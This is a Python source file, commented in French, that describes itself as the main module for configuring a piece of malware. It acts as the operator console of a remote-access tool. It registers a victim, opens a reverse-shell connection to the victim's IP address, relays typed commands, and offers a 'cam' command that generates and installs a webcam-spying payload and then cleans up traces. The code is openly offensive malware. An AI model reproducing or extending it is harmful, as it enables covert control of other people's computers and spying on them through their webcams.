"""
Author: Wallaby
Created: 2025-02-26
Description: module principal pour le configurer le malware
TODO: régler le bug des gitignore
      gérer les signals ?
"""

# importation des modules
import socket
import modules.cam_pirate as cam
from modules.fonctions import (
    get_self_ip,
    menu,
    nettoyage,
    new_victime,
    read_victime_ip,
    connect_reverse_shell,
    get_msg,
    choix,
    create_server,
)

# Recuperation de l'adresse IP hôte
HOST: str = get_self_ip()

# Affichage du menu
menu()
choix: str = choix()

server_js, server_python = create_server()
if choix == "1":
    new_victime(HOST)

menu()
print("démarage de l'ecoute", end="\r")

ip_victime = read_victime_ip()

server_js.terminate()

menu(True)
len_msg: int = 4096
PORT: int = 55027
mySocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

connect_reverse_shell(mySocket, ip_victime, PORT)

while True:
    msg: str = input("C> ")
    if msg == "cam":
        menu()
        cam.gen_payload(HOST)

        cam.install(mySocket, HOST, len_msg)

        cam.webcam()

        cam.clean(mySocket, len_msg)

        menu(True)

    elif msg == "exit":
        break

    elif msg == "fin":
        nettoyage(mySocket)
        break

    else:
        mySocket.send(msg.encode("Utf8"))
        get_msg(mySocket, len_msg, True)


print("Connexion interrompue.")
mySocket.close()
server_python.terminate()
